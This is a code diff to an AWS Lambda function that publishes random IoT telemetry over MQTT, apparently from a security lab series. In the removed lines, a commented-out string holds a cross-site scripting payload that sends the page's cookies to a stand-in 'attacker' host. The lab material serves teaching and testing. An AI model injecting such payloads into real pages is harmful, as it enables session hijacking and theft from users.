@@ -2,6 +2,8 @@ import boto3
 import os
 import requests
 import random
+import string
+
 from AWSIoTPythonSDK.MQTTLib import AWSIoTMQTTClient
 
 def lambda_handler(event, context):
@@ -51,10 +53,22 @@ def lambda_handler(event, context):
 	myMQTTClient.configureConnectDisconnectTimeout(10)  # 10 sec
 	myMQTTClient.configureMQTTOperationTimeout(5)  # 5 sec
 
-	#generate random temperature
-	deviceTemperature = round(random.uniform(15.1,29.9),2)
-	# badstring = "<script> window.location='http://attacker/?cookie='+document.cookie </script>"
+	#generate random temperature (comment out the line of code in Lab 4)
+	telemetrydata = round(random.uniform(15.1,29.9),2)
+
+	#uncomment the line of code below to generate random String in Lab 4
+	#telemetrydata = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 3000)) 
+
 	# Connect to AWS IoT
 	myMQTTClient.connect()
-	myMQTTClient.publish(topicname, deviceTemperature, 0)
+	myMQTTClient.publish(topicname, telemetrydata, 0)
 	myMQTTClient.disconnect()
+
+
+
+
+
+
+
+
+
